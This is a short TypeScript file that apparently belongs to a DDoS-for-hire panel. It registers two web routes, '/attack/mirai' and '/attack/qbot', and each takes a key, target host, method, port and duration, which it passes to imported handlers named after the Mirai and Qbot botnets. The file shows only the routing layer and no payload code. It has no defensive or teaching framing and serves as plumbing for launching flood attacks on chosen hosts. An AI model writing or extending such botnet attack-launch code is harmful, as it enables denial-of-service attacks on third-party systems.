import { mirai, qbot } from 'routes/attack';

export const routes = (app: any) => {
	app.get('/attack/mirai/:key/:host/:method/:port/:time', mirai);
	app.get('/attack/qbot/:key/:host/:method/:port/:time', qbot);
};
